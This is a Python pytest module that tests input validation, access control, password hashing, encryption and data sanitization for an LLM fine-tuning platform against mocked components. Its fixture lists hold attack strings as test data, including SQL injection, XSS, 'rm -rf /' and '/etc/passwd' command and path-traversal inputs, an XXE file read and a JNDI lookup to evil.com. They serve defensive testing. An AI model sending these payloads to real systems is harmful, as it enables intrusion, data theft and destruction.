"""
Security and validation testing suite for comprehensive security assessment.

This test module implements security testing, input validation, access control,
data protection, and vulnerability assessment across all platform components.
"""

import pytest
import hashlib
import secrets
import base64
import tempfile
import shutil
import os
import json
import time
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timezone, timedelta
from pathlib import Path
from contextlib import contextmanager
from typing import Dict, List, Optional, Any, Union
import re

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))
sys.path.insert(0, str(Path(__file__).parent.parent))

from tests.mocks import (
    mock_dependencies_context, create_mock_environment
)


class SecurityTester:
    """Core security testing utilities."""
    
    def __init__(self):
        self.test_results = []
        self.vulnerabilities = []
        
    def test_input_validation(self, function: callable, test_inputs: List[Any]) -> Dict:
        """Test function with various malicious inputs."""
        results = {
            "function": function.__name__,
            "total_tests": len(test_inputs),
            "passed": 0,
            "failed": 0,
            "vulnerabilities": []
        }
        
        for i, test_input in enumerate(test_inputs):
            try:
                result = function(test_input)
                # If no exception, check if result contains injected content
                if isinstance(result, str) and self._contains_injection(result, test_input):
                    results["vulnerabilities"].append({
                        "input": str(test_input)[:100],
                        "vulnerability": "Input injection not properly sanitized",
                        "severity": "high"
                    })
                    results["failed"] += 1
                else:
                    results["passed"] += 1
            except (ValueError, TypeError, AttributeError) as e:
                # Expected security exception - good
                results["passed"] += 1
            except Exception as e:
                # Unexpected exception - potential vulnerability
                results["vulnerabilities"].append({
                    "input": str(test_input)[:100],
                    "vulnerability": f"Unexpected exception: {type(e).__name__}",
                    "error": str(e)[:200],
                    "severity": "medium"
                })
                results["failed"] += 1
        
        return results
    
    def _contains_injection(self, result: str, test_input: Any) -> bool:
        """Check if result contains traces of injection attempt."""
        if not isinstance(test_input, str):
            return False
        
        # Check for common injection patterns
        injection_patterns = [
            "<script>", "javascript:", "eval(", "exec(",
            "SELECT * FROM", "DROP TABLE", "UNION SELECT",
            "../", "..\\", "/etc/passwd", "C:\\Windows"
        ]
        
        result_lower = result.lower()
        input_lower = str(test_input).lower()
        
        for pattern in injection_patterns:
            if pattern.lower() in input_lower and pattern.lower() in result_lower:
                return True
        
        return False
    
    def test_access_control(self, function: callable, roles: List[str], 
                          protected_operations: List[str]) -> Dict:
        """Test access control enforcement."""
        results = {
            "function": function.__name__,
            "total_tests": len(roles) * len(protected_operations),
            "access_violations": []
        }
        
        for role in roles:
            for operation in protected_operations:
                try:
                    # Mock user context
                    with self._mock_user_context(role):
                        result = function(operation)
                        
                        # Check if unauthorized access was granted
                        if self._is_unauthorized_access(role, operation, result):
                            results["access_violations"].append({
                                "role": role,
                                "operation": operation,
                                "vulnerability": "Unauthorized access granted",
                                "severity": "critical"
                            })
                except PermissionError:
                    # Expected for unauthorized roles - good
                    pass
                except Exception as e:
                    results["access_violations"].append({
                        "role": role,
                        "operation": operation,
                        "vulnerability": f"Access control bypass: {type(e).__name__}",
                        "error": str(e),
                        "severity": "high"
                    })
        
        return results
    
    @contextmanager
    def _mock_user_context(self, role: str):
        """Mock user context for testing."""
        # This would integrate with actual user context system
        original_role = getattr(self, '_current_role', None)
        self._current_role = role
        try:
            yield
        finally:
            self._current_role = original_role
    
    def _is_unauthorized_access(self, role: str, operation: str, result: Any) -> bool:
        """Check if access should have been denied."""
        # Define role-operation access matrix
        access_matrix = {
            "guest": [],
            "user": ["read", "list"],
            "admin": ["read", "list", "write", "delete"],
            "system": ["read", "list", "write", "delete", "configure"]
        }
        
        allowed_operations = access_matrix.get(role, [])
        return operation not in allowed_operations and result is not None


class InputValidationTester:
    """Test input validation and sanitization."""
    
    def __init__(self):
        self.malicious_inputs = self._generate_malicious_inputs()
    
    def _generate_malicious_inputs(self) -> List[Any]:
        """Generate various malicious input patterns."""
        return [
            # SQL Injection attempts
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            
            # XSS attempts
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            
            # Command injection
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& del C:\\Windows\\System32",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\sam",
            "/etc/passwd%00",
            
            # Format string attacks
            "%s%s%s%s%s%n",
            "{0.__class__.__bases__[0].__subclasses__()}",
            
            # Buffer overflow attempts
            "A" * 10000,
            "A" * 100000,
            
            # Code injection
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec('import os; os.system(\"whoami\")')",
            "__import__('subprocess').call(['ls'])",
            
            # LDAP injection
            "*(|(objectClass=*))",
            "admin)(&(password=*))",
            
            # XML/XXE attempts
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>",
            
            # Template injection
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            
            # Special characters and encodings
            "\x00\x01\x02\x03",
            "%00%0a%0d",
            "\u0000\u000a\u000d",
            
            # Extremely long inputs
            "x" * (1024 * 1024),  # 1MB string
            
            # Null and empty values
            None,
            "",
            [],
            {},
            
            # Type confusion
            [1, 2, 3],
            {"key": "value"},
            True,
            False,
            float('inf'),
            float('nan'),
        ]
    
    def test_text_input_validation(self, validator_function: callable) -> Dict:
        """Test text input validation."""
        security_tester = SecurityTester()
        return security_tester.test_input_validation(validator_function, self.malicious_inputs)
    
    def test_file_path_validation(self, path_validator: callable) -> Dict:
        """Test file path validation for directory traversal."""
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "file:///etc/passwd",
            "\\\\server\\share\\file",
            "CON", "PRN", "AUX", "NUL",  # Windows reserved names
            "file\x00.txt",  # Null byte injection
            "very" + "/" * 1000 + "long/path",  # Extremely long path
        ]
        
        security_tester = SecurityTester()
        return security_tester.test_input_validation(path_validator, path_attacks)
    
    def test_configuration_validation(self, config_validator: callable) -> Dict:
        """Test configuration input validation."""
        config_attacks = [
            {"__class__": "malicious"},
            {"eval": "__import__('os').system('ls')"},
            {"${jndi:ldap://evil.com/a}": "value"},
            {"nested": {"very": {"deep": {"malicious": "value"}}}},
            {("tuple", "key"): "value"},
            {"unicode_attack": "\u202e\u202d"},
            {"large_value": "x" * (10 * 1024 * 1024)},  # 10MB value
            {"null_bytes": "value\x00hidden"},
        ]
        
        security_tester = SecurityTester()
        return security_tester.test_input_validation(config_validator, config_attacks)


class CryptographicSecurityTester:
    """Test cryptographic implementations and security."""
    
    def test_password_hashing(self, hash_function: callable) -> Dict:
        """Test password hashing security."""
        test_passwords = [
            "password123",
            "admin",
            "",
            "a" * 1000,
            "unicodé_påsswørð",
            "password\x00hidden",
        ]
        
        results = {
            "hash_function": hash_function.__name__,
            "tests": [],
            "vulnerabilities": []
        }
        
        previous_hashes = set()
        
        for password in test_passwords:
            try:
                hash_result = hash_function(password)
                
                # Test hash properties
                test_result = {
                    "password": password[:20] + "..." if len(password) > 20 else password,
                    "hash_length": len(hash_result) if isinstance(hash_result, str) else 0,
                    "is_unique": hash_result not in previous_hashes,
                    "contains_password": password.lower() in str(hash_result).lower()
                }
                
                # Security checks
                if not test_result["is_unique"]:
                    results["vulnerabilities"].append({
                        "issue": "Hash collision detected",
                        "severity": "critical"
                    })
                
                if test_result["contains_password"]:
                    results["vulnerabilities"].append({
                        "issue": "Password visible in hash",
                        "severity": "critical"
                    })
                
                if test_result["hash_length"] < 32:
                    results["vulnerabilities"].append({
                        "issue": "Hash too short (weak)",
                        "severity": "high"
                    })
                
                previous_hashes.add(hash_result)
                results["tests"].append(test_result)
                
            except Exception as e:
                results["vulnerabilities"].append({
                    "issue": f"Hash function error: {str(e)}",
                    "password": password[:20],
                    "severity": "medium"
                })
        
        return results
    
    def test_encryption_decryption(self, encrypt_function: callable, 
                                 decrypt_function: callable, key: str) -> Dict:
        """Test encryption/decryption security."""
        test_data = [
            "sensitive_data",
            "",
            "a" * 1000,
            "unicode_data_éñ中文",
            "data\x00with\x01special\x02bytes",
            json.dumps({"key": "value", "nested": {"data": True}}),
        ]
        
        results = {
            "total_tests": len(test_data),
            "successful_encryptions": 0,
            "successful_decryptions": 0,
            "vulnerabilities": []
        }
        
        for data in test_data:
            try:
                # Test encryption
                encrypted = encrypt_function(data, key)
                results["successful_encryptions"] += 1
                
                # Security checks on encrypted data
                if data in str(encrypted):
                    results["vulnerabilities"].append({
                        "issue": "Plaintext visible in ciphertext",
                        "severity": "critical"
                    })
                
                if len(encrypted) == len(data):
                    results["vulnerabilities"].append({
                        "issue": "No encryption expansion (possible no-op)",
                        "severity": "high"
                    })
                
                # Test decryption
                decrypted = decrypt_function(encrypted, key)
                results["successful_decryptions"] += 1
                
                # Verify decryption correctness
                if decrypted != data:
                    results["vulnerabilities"].append({
                        "issue": "Decryption corruption",
                        "severity": "high"
                    })
                
            except Exception as e:
                results["vulnerabilities"].append({
                    "issue": f"Encryption/decryption error: {str(e)}",
                    "severity": "medium"
                })
        
        return results
    
    def test_random_generation(self, random_function: callable, 
                             iterations: int = 1000) -> Dict:
        """Test randomness quality."""
        generated_values = []
        
        for _ in range(iterations):
            try:
                value = random_function()
                generated_values.append(value)
            except Exception as e:
                return {"error": f"Random generation failed: {str(e)}"}
        
        # Analyze randomness
        unique_values = set(generated_values)
        uniqueness_ratio = len(unique_values) / len(generated_values)
        
        results = {
            "total_generated": len(generated_values),
            "unique_values": len(unique_values),
            "uniqueness_ratio": uniqueness_ratio,
            "vulnerabilities": []
        }
        
        # Randomness quality checks
        if uniqueness_ratio < 0.95:
            results["vulnerabilities"].append({
                "issue": f"Low uniqueness ratio: {uniqueness_ratio:.3f}",
                "severity": "high"
            })
        
        # Check for patterns
        if len(generated_values) > 10:
            consecutive_identical = 0
            for i in range(1, len(generated_values)):
                if generated_values[i] == generated_values[i-1]:
                    consecutive_identical += 1
            
            if consecutive_identical > len(generated_values) * 0.01:  # >1% consecutive identical
                results["vulnerabilities"].append({
                    "issue": f"Too many consecutive identical values: {consecutive_identical}",
                    "severity": "medium"
                })
        
        return results


class AccessControlTester:
    """Test access control and authorization mechanisms."""
    
    def test_role_based_access_control(self, rbac_system: Any) -> Dict:
        """Test role-based access control."""
        test_scenarios = [
            # (role, resource, action, should_allow)
            ("admin", "users", "create", True),
            ("admin", "users", "read", True),
            ("admin", "users", "update", True),
            ("admin", "users", "delete", True),
            ("user", "users", "read", True),
            ("user", "users", "create", False),
            ("user", "users", "delete", False),
            ("guest", "users", "read", False),
            ("guest", "public", "read", True),
            ("", "users", "read", False),  # No role
            (None, "users", "read", False),  # Null role
        ]
        
        results = {
            "total_tests": len(test_scenarios),
            "passed": 0,
            "failed": 0,
            "access_violations": []
        }
        
        for role, resource, action, should_allow in test_scenarios:
            try:
                # Mock the check
                access_granted = rbac_system.check_access(role, resource, action)
                
                if access_granted == should_allow:
                    results["passed"] += 1
                else:
                    violation_type = "Unauthorized access granted" if access_granted else "Legitimate access denied"
                    results["access_violations"].append({
                        "role": role,
                        "resource": resource,
                        "action": action,
                        "expected": should_allow,
                        "actual": access_granted,
                        "violation": violation_type,
                        "severity": "high" if access_granted and not should_allow else "medium"
                    })
                    results["failed"] += 1
                    
            except Exception as e:
                results["access_violations"].append({
                    "role": role,
                    "resource": resource,
                    "action": action,
                    "error": str(e),
                    "violation": "Access control system error",
                    "severity": "critical"
                })
                results["failed"] += 1
        
        return results
    
    def test_privilege_escalation(self, auth_system: Any) -> Dict:
        """Test for privilege escalation vulnerabilities."""
        escalation_attempts = [
            # Try to escalate by modifying role
            {"user_id": "user1", "role": "admin"},
            {"user_id": "user1", "role": ["user", "admin"]},
            {"user_id": "user1", "role": {"__class__": "admin"}},
            
            # Try to escalate through manipulation
            {"user_id": "user1' OR role='admin' --"},
            {"user_id": {"$ne": None}, "role": "admin"},
            
            # Try to escalate through injection
            {"user_id": "user1", "role": "user'); UPDATE users SET role='admin' WHERE id='user1'; --"},
        ]
        
        results = {
            "total_attempts": len(escalation_attempts),
            "escalations_blocked": 0,
            "vulnerabilities": []
        }
        
        for attempt in escalation_attempts:
            try:
                # Attempt the escalation
                result = auth_system.authenticate_user(attempt)
                
                # Check if escalation succeeded
                if self._is_escalation_successful(result, attempt):
                    results["vulnerabilities"].append({
                        "attempt": str(attempt)[:100],
                        "vulnerability": "Privilege escalation successful",
                        "severity": "critical"
                    })
                else:
                    results["escalations_blocked"] += 1
                    
            except Exception:
                # Exception is good - escalation was blocked
                results["escalations_blocked"] += 1
        
        return results
    
    def _is_escalation_successful(self, result: Any, attempt: Dict) -> bool:
        """Check if privilege escalation was successful."""
        if not result:
            return False
        
        # Check if user gained admin privileges
        if hasattr(result, 'role') and result.role == 'admin':
            return True
        
        if isinstance(result, dict) and result.get('role') == 'admin':
            return True
        
        return False


class DataProtectionTester:
    """Test data protection and privacy mechanisms."""
    
    def test_sensitive_data_exposure(self, data_processor: callable) -> Dict:
        """Test for sensitive data exposure in logs/outputs."""
        sensitive_data_patterns = [
            ("password", "password123"),
            ("api_key", "sk-abcd1234567890"),
            ("credit_card", "4111-1111-1111-1111"),
            ("ssn", "123-45-6789"),
            ("email", "user@example.com"),
            ("phone", "+1-555-123-4567"),
            ("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"),
        ]
        
        results = {
            "total_tests": len(sensitive_data_patterns),
            "data_exposures": []
        }
        
        for data_type, sensitive_value in sensitive_data_patterns:
            try:
                # Process data that contains sensitive information
                test_data = {
                    "user_input": f"My {data_type} is {sensitive_value}",
                    data_type: sensitive_value,
                    "metadata": {"contains_sensitive": True}
                }
                
                result = data_processor(test_data)
                
                # Check if sensitive data appears in result
                result_str = str(result).lower()
                if sensitive_value.lower() in result_str:
                    results["data_exposures"].append({
                        "data_type": data_type,
                        "exposed_value": sensitive_value,
                        "vulnerability": "Sensitive data in output",
                        "severity": "high"
                    })
                
            except Exception as e:
                # Processor should handle sensitive data gracefully
                if sensitive_value in str(e):
                    results["data_exposures"].append({
                        "data_type": data_type,
                        "exposed_value": sensitive_value,
                        "vulnerability": "Sensitive data in exception",
                        "severity": "medium"
                    })
        
        return results
    
    def test_data_sanitization(self, sanitizer_function: callable) -> Dict:
        """Test data sanitization effectiveness."""
        test_cases = [
            ("password field", {"password": "secret123"}, "password"),
            ("api key", {"api_key": "sk-1234567890"}, "api_key"),
            ("nested sensitive", {"user": {"password": "secret"}}, "password"),
            ("mixed data", {"name": "John", "password": "secret", "email": "john@example.com"}, "password"),
        ]
        
        results = {
            "total_tests": len(test_cases),
            "sanitization_failures": []
        }
        
        for test_name, input_data, sensitive_field in test_cases:
            try:
                sanitized = sanitizer_function(input_data)
                
                # Check if sensitive data was properly sanitized
                sanitized_str = str(sanitized).lower()
                original_value = str(input_data.get(sensitive_field, "")).lower()
                
                if original_value and original_value in sanitized_str:
                    results["sanitization_failures"].append({
                        "test": test_name,
                        "field": sensitive_field,
                        "vulnerability": "Sensitive data not sanitized",
                        "severity": "high"
                    })
                
            except Exception as e:
                results["sanitization_failures"].append({
                    "test": test_name,
                    "error": str(e),
                    "vulnerability": "Sanitization function error",
                    "severity": "medium"
                })
        
        return results


class TestModelSecurityValidation:
    """Test security aspects of model operations."""
    
    def test_model_input_validation(self):
        """Test model input validation security."""
        with mock_dependencies_context() as env:
            from tests.mocks import MockTransformerModel, MockTokenizer
            
            model = MockTransformerModel("test-model")
            tokenizer = MockTokenizer()
            
            def model_inference_with_validation(text_input):
                """Model inference with input validation."""
                if not isinstance(text_input, str):
                    raise TypeError("Input must be string")
                
                if len(text_input) > 10000:
                    raise ValueError("Input too long")
                
                # Check for potential injection patterns
                dangerous_patterns = ["<script>", "javascript:", "eval("]
                for pattern in dangerous_patterns:
                    if pattern.lower() in text_input.lower():
                        raise ValueError("Potentially dangerous input detected")
                
                encoding = tokenizer(text_input)
                import torch
                input_ids = torch.tensor([encoding.input_ids])
                return model(input_ids=input_ids)
            
            # Test with security validation
            input_tester = InputValidationTester()
            results = input_tester.test_text_input_validation(model_inference_with_validation)
            
            # Should block most malicious inputs
            assert results["passed"] > results["failed"], "Model input validation too permissive"
            assert len(results["vulnerabilities"]) < 5, "Too many input validation vulnerabilities"
    
    def test_model_output_sanitization(self):
        """Test model output sanitization."""
        with mock_dependencies_context() as env:
            from tests.mocks import MockTransformerModel
            
            model = MockTransformerModel("test-model")
            
            def sanitized_model_output(input_text):
                """Generate model output with sanitization."""
                # Mock model output that might contain sensitive patterns
                raw_output = f"Model response to: {input_text}"
                
                # Sanitize output
                sensitive_patterns = [
                    (r'password[:\s=]+\w+', '[PASSWORD_REDACTED]'),
                    (r'api[_\s]key[:\s=]+[\w-]+', '[API_KEY_REDACTED]'),
                    (r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b', '[CARD_REDACTED]'),
                ]
                
                sanitized_output = raw_output
                for pattern, replacement in sensitive_patterns:
                    sanitized_output = re.sub(pattern, replacement, sanitized_output, flags=re.IGNORECASE)
                
                return sanitized_output
            
            # Test sanitization
            protection_tester = DataProtectionTester()
            results = protection_tester.test_sensitive_data_exposure(
                lambda data: sanitized_model_output(data.get("user_input", ""))
            )
            
            # Should not expose sensitive data
            assert len(results["data_exposures"]) == 0, "Model output exposes sensitive data"
    
    def test_model_access_control(self):
        """Test model access control."""
        with mock_dependencies_context() as env:
            
            class MockModelAccessControl:
                def __init__(self):
                    self.user_roles = {
                        "admin": ["load_model", "fine_tune", "delete_model"],
                        "trainer": ["load_model", "fine_tune"],
                        "user": ["load_model"],
                        "guest": []
                    }
                
                def check_access(self, role, resource, action):
                    if role not in self.user_roles:
                        return False
                    return action in self.user_roles[role]
            
            rbac_system = MockModelAccessControl()
            access_tester = AccessControlTester()
            results = access_tester.test_role_based_access_control(rbac_system)
            
            # Should have proper access control
            assert results["failed"] == 0, f"Access control failures: {results['access_violations']}"
            assert len(results["access_violations"]) == 0, "Access control violations detected"


class TestConfigurationSecurity:
    """Test security of configuration system."""
    
    def test_configuration_input_validation(self):
        """Test configuration input validation."""
        with mock_dependencies_context() as env:
            from src.fine_tune_llm.config.manager import ConfigManager
            
            config_manager = ConfigManager()
            
            def secure_config_setter(config_data):
                """Secure configuration setter with validation."""
                if not isinstance(config_data, dict):
                    raise TypeError("Configuration must be dictionary")
                
                # Check for dangerous keys
                dangerous_keys = ["__class__", "__module__", "eval", "exec", "import"]
                for key in config_data.keys():
                    if any(dangerous in str(key).lower() for dangerous in dangerous_keys):
                        raise ValueError(f"Dangerous configuration key: {key}")
                
                # Validate configuration structure
                max_depth = 10
                def check_depth(obj, depth=0):
                    if depth > max_depth:
                        raise ValueError("Configuration too deeply nested")
                    if isinstance(obj, dict):
                        for value in obj.values():
                            check_depth(value, depth + 1)
                
                check_depth(config_data)
                
                # Set configuration
                for key, value in config_data.items():
                    config_manager.set(key, value)
                
                return True
            
            # Test configuration validation
            input_tester = InputValidationTester()
            results = input_tester.test_configuration_validation(secure_config_setter)
            
            # Should block malicious configurations
            assert results["passed"] > results["failed"], "Configuration validation too permissive"
            assert len(results["vulnerabilities"]) < 3, "Too many configuration vulnerabilities"
    
    def test_configuration_encryption(self):
        """Test configuration encryption for sensitive values."""
        with mock_dependencies_context() as env:
            
            def mock_encrypt(data, key):
                """Mock encryption function."""
                if not data or not key:
                    raise ValueError("Data and key required")
                
                # Simple mock encryption (not secure, just for testing)
                encrypted = base64.b64encode(f"{key}:{data}".encode()).decode()
                return f"ENC[{encrypted}]"
            
            def mock_decrypt(encrypted_data, key):
                """Mock decryption function."""
                if not encrypted_data.startswith("ENC[") or not encrypted_data.endswith("]"):
                    raise ValueError("Invalid encrypted data format")
                
                encrypted_part = encrypted_data[4:-1]
                decoded = base64.b64decode(encrypted_part).decode()
                stored_key, data = decoded.split(":", 1)
                
                if stored_key != key:
                    raise ValueError("Invalid decryption key")
                
                return data
            
            # Test encryption/decryption
            crypto_tester = CryptographicSecurityTester()
            results = crypto_tester.test_encryption_decryption(
                mock_encrypt, mock_decrypt, "test_key_123"
            )
            
            # Should properly encrypt/decrypt
            assert results["successful_encryptions"] > 0, "No successful encryptions"
            assert results["successful_decryptions"] > 0, "No successful decryptions"
            assert len(results["vulnerabilities"]) == 0, f"Encryption vulnerabilities: {results['vulnerabilities']}"


class TestDataPipelineSecurity:
    """Test security of data pipeline operations."""
    
    def test_file_path_validation(self):
        """Test file path validation security."""
        with mock_dependencies_context() as env:
            
            def secure_file_loader(file_path):
                """Secure file loader with path validation."""
                if not isinstance(file_path, str):
                    raise TypeError("File path must be string")
                
                # Normalize path
                normalized_path = os.path.normpath(file_path)
                
                # Check for directory traversal
                if ".." in normalized_path:
                    raise ValueError("Directory traversal not allowed")
                
                # Check for absolute paths to sensitive locations
                sensitive_paths = ["/etc", "/proc", "/sys", "C:\\Windows", "C:\\Program Files"]
                for sensitive in sensitive_paths:
                    if normalized_path.startswith(sensitive):
                        raise ValueError("Access to sensitive path not allowed")
                
                # Check for null bytes
                if "\x00" in file_path:
                    raise ValueError("Null bytes in path not allowed")
                
                # Mock file loading
                return f"File loaded: {normalized_path}"
            
            # Test path validation
            input_tester = InputValidationTester()
            results = input_tester.test_file_path_validation(secure_file_loader)
            
            # Should block malicious paths
            assert results["passed"] > results["failed"], "File path validation too permissive"
            assert len(results["vulnerabilities"]) < 3, "Too many path validation vulnerabilities"
    
    def test_data_sanitization(self):
        """Test data sanitization in pipeline."""
        with mock_dependencies_context() as env:
            
            def data_sanitizer(input_data):
                """Sanitize data in pipeline."""
                if isinstance(input_data, dict):
                    sanitized = {}
                    for key, value in input_data.items():
                        # Sanitize keys
                        if isinstance(key, str):
                            key = re.sub(r'[<>"\']', '', key)
                        
                        # Sanitize values
                        if isinstance(value, str):
                            # Remove potential script tags
                            value = re.sub(r'<script.*?</script>', '', value, flags=re.IGNORECASE | re.DOTALL)
                            # Remove javascript: URLs
                            value = re.sub(r'javascript:', '', value, flags=re.IGNORECASE)
                            # Redact potential passwords
                            value = re.sub(r'password[:\s=]+\w+', '[REDACTED]', value, flags=re.IGNORECASE)
                        
                        sanitized[key] = value
                    return sanitized
                
                return input_data
            
            # Test sanitization
            protection_tester = DataProtectionTester()
            results = protection_tester.test_data_sanitization(data_sanitizer)
            
            # Should properly sanitize data
            assert len(results["sanitization_failures"]) == 0, f"Sanitization failures: {results['sanitization_failures']}"


class TestAuthenticationSecurity:
    """Test authentication and session security."""
    
    def test_password_security(self):
        """Test password hashing security."""
        
        def secure_password_hasher(password):
            """Secure password hashing function."""
            if not isinstance(password, str):
                raise TypeError("Password must be string")
            
            # Use salt for security
            salt = secrets.token_hex(16)
            
            # Hash with salt
            hash_obj = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
            hash_hex = hash_obj.hex()
            
            return f"{salt}:{hash_hex}"
        
        # Test password hashing
        crypto_tester = CryptographicSecurityTester()
        results = crypto_tester.test_password_hashing(secure_password_hasher)
        
        # Should securely hash passwords
        assert len(results["vulnerabilities"]) == 0, f"Password hashing vulnerabilities: {results['vulnerabilities']}"
        
        # All hashes should be unique
        for test in results["tests"]:
            assert test["is_unique"], "Non-unique password hashes detected"
            assert not test["contains_password"], "Password visible in hash"
    
    def test_session_security(self):
        """Test session token security."""
        
        def generate_session_token():
            """Generate secure session token."""
            return secrets.token_urlsafe(32)
        
        # Test token randomness
        crypto_tester = CryptographicSecurityTester()
        results = crypto_tester.test_random_generation(generate_session_token, iterations=100)
        
        # Should generate unique tokens
        assert results["uniqueness_ratio"] > 0.99, f"Low token uniqueness: {results['uniqueness_ratio']}"
        assert len(results["vulnerabilities"]) == 0, f"Token generation vulnerabilities: {results['vulnerabilities']}"
    
    def test_privilege_escalation_prevention(self):
        """Test privilege escalation prevention."""
        
        class MockAuthSystem:
            def __init__(self):
                self.users = {
                    "user1": {"role": "user", "permissions": ["read"]},
                    "admin1": {"role": "admin", "permissions": ["read", "write", "delete"]}
                }
            
            def authenticate_user(self, credentials):
                user_id = credentials.get("user_id")
                if user_id in self.users:
                    # Only return existing user data, ignore role in credentials
                    return self.users[user_id]
                return None
        
        auth_system = MockAuthSystem()
        access_tester = AccessControlTester()
        results = access_tester.test_privilege_escalation(auth_system)
        
        # Should prevent privilege escalation
        assert len(results["vulnerabilities"]) == 0, f"Privilege escalation vulnerabilities: {results['vulnerabilities']}"
        assert results["escalations_blocked"] == results["total_attempts"], "Some escalation attempts succeeded"


def test_comprehensive_security_audit():
    """Run comprehensive security audit across all components."""
    with mock_dependencies_context() as env:
        
        # Initialize testers
        input_tester = InputValidationTester()
        crypto_tester = CryptographicSecurityTester()
        access_tester = AccessControlTester()
        protection_tester = DataProtectionTester()
        
        audit_results = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "total_vulnerabilities": 0,
            "critical_vulnerabilities": 0,
            "high_vulnerabilities": 0,
            "medium_vulnerabilities": 0,
            "low_vulnerabilities": 0,
            "components_tested": [],
            "overall_security_score": 0.0
        }
        
        # Mock functions for testing
        def mock_secure_function(input_data):
            """Mock secure function that validates input."""
            if not isinstance(input_data, (str, dict, list)):
                raise TypeError("Invalid input type")
            
            dangerous_content = ["<script>", "eval(", "exec(", "DROP TABLE"]
            input_str = str(input_data).lower()
            
            for danger in dangerous_content:
                if danger.lower() in input_str:
                    raise ValueError("Dangerous content detected")
            
            return f"Processed: {input_data}"
        
        # Test input validation
        validation_results = input_tester.test_text_input_validation(mock_secure_function)
        audit_results["components_tested"].append({
            "component": "input_validation",
            "vulnerabilities": len(validation_results["vulnerabilities"]),
            "results": validation_results
        })
        
        # Count vulnerabilities by severity
        for vuln in validation_results["vulnerabilities"]:
            severity = vuln.get("severity", "medium")
            audit_results[f"{severity}_vulnerabilities"] += 1
            audit_results["total_vulnerabilities"] += 1
        
        # Calculate security score (0-100, higher is better)
        total_tests = sum(len(component["results"].get("vulnerabilities", [])) + 
                         component["results"].get("passed", 0) + 
                         component["results"].get("failed", 0)
                         for component in audit_results["components_tested"])
        
        if total_tests > 0:
            security_score = (1 - audit_results["total_vulnerabilities"] / total_tests) * 100
            audit_results["overall_security_score"] = max(0, security_score)
        
        # Security audit should pass basic requirements
        assert audit_results["critical_vulnerabilities"] == 0, "Critical security vulnerabilities found"
        assert audit_results["overall_security_score"] > 70, f"Security score too low: {audit_results['overall_security_score']}"
        
        print(f"Security Audit Summary:")
        print(f"  Overall Score: {audit_results['overall_security_score']:.1f}/100")
        print(f"  Total Vulnerabilities: {audit_results['total_vulnerabilities']}")
        print(f"  Critical: {audit_results['critical_vulnerabilities']}")
        print(f"  High: {audit_results['high_vulnerabilities']}")
        print(f"  Medium: {audit_results['medium_vulnerabilities']}")
        print(f"  Low: {audit_results['low_vulnerabilities']}")
        
        return audit_results